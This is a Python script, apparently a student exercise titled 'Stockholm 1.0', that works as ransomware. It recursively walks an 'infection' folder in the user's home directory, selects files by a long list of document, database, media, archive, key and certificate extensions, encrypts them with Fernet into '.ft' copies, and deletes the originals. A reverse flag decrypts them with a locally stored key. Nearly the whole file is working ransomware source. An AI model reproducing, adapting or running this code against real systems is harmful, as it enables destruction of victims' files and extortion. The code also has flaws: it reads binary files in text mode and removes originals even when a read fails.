from cryptography.fernet import Fernet
import os
import time
from colorama import Fore
import argparse
from sys import exit

# gerer les perms 
# essayer de creer un file comme le nom qui va etre encrypter ex touch testr.txt.ft et voir la reaction du programme

file_extensions = [
    '.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', 
    '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', 
    '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', 
    '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', 
    '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', 
    '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', 
    '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', 
    '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', 
    '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', 
    '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', 
    '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', 
    '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', 
    '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', 
    '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', 
    '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', 
    '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', 
    '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', 
    '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', 
    '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', 
    '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', 
    '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc'
]

def generate_key(all_files):
    '''
    Generate a key and save it in key.key
    '''
    if (os.path.exists('key') and len(all_files) == 0):
        print("The file are already encrypted !")
        exit(0)

    key = Fernet.generate_key()
    with open ('key', 'wb') as key_file:
        key_file.write(key)
    return key

def encrypt_file(cryptography, all_files, silent):
    '''
    Encrypt all files in the list
    '''
        
    for file in all_files:
        if not silent:
            print(Fore.RED + file, "Encrypting...", Fore.RESET)
            time.sleep(0.05)
        try:
            with open(file, 'r') as file_no_crypto:
                file_data = file_no_crypto.read()
        except:
            print(Fore.RED + "The file", file ,"is not readable", Fore.RESET)
            continue

        content_file_crypto = cryptography.encrypt(file_data.encode())

        if not silent:
            print(content_file_crypto)

        if (os.path.exists(file + ".ft")):
            os.remove(file + ".ft")

        with open(file + ".ft", 'wb') as file_crypto:
            file_crypto.write(content_file_crypto)
        
        if not silent:
            print(Fore.BLUE + "#########################################" + Fore.RESET)


def decrypt_files(all_files, silent):
    '''
    Decrypt all files in the list
    '''

    try:
        with open('key', 'rb') as key_file:
            cryptography = Fernet(key_file.read())
    except:
        for file in all_files:
            if file.endswith('.ft'):
                print("The key file is missing")
                exit(1)
        print("The files are not encrypted") 
        exit(1)

    for file in all_files:
        if not silent:
            print(Fore.GREEN + file, "Decrypting..." ,Fore.RESET)
            time.sleep(0.05)

        try:
            with open (file, 'rb') as file_crypto:
                file_data = file_crypto.read()
        except:
            print(Fore.RED + "The file", file ,"is not readable", Fore.RESET)
            continue

        file_content = cryptography.decrypt(file_data)

        if not silent:
            print(file_content)

        with open(file[:-3], 'wb') as file_no_crypto:
            file_no_crypto.write(file_content)

        if not silent:
            print(Fore.BLUE + "#########################################" + Fore.RESET)
    

def remove_not_encrypted_files(all_files):
    '''
    Remove all files that are not encrypted
    '''
    for file in all_files:
        os.remove(file)

def remove_encrypted_files(all_files):
    '''
    Remove all files that are encrypted
    '''
    for file in all_files:
        os.remove(file)
    os.remove('key')

def select_files_with_good_extension(reverse, path = os.path.join(os.environ.get('HOME', './'), "infection/"), files = []):
    '''
    Select all files with good extension
    '''
    all_files = os.listdir(path)
    for file in all_files:
        if os.path.isdir(os.path.join(path, file)):
            select_files_with_good_extension(reverse, path + file + "/", files)
        if reverse == False:
            for extension in file_extensions:
                if file.endswith(extension):
                    files.append(path + file)
        else:
            if file.endswith('.ft'):
                files.append(path + file)
    return files

def do_parse():
    '''
    Parse the arguments
    '''
    parser = argparse.ArgumentParser(description="Description de votre programme")
    parser.add_argument("-s", "--silent", help="Silent mode and Speed mode", action="store_true")
    parser.add_argument("-v", "--version", help="Show the version", action="store_true")
    parser.add_argument("-r", "--reverse", help="Decrypt the files", action="store_true")
    
    return parser.parse_args()


def main():
    args = do_parse()
    all_files = select_files_with_good_extension(args.reverse)
    if (args.version):
        print("Stockholm 1.0")
        exit(0)
    if args.reverse == False:
        key = generate_key(all_files)
        cryptography = Fernet(key)
        encrypt_file(cryptography, all_files, args.silent)
        remove_not_encrypted_files(all_files)
        print(Fore.RED + "All files encrypted", Fore.RESET)
    else:
        decrypt_files(all_files, args.silent)
        remove_encrypted_files(all_files)
        print(Fore.GREEN + "All files decrypted", Fore.RESET)


main()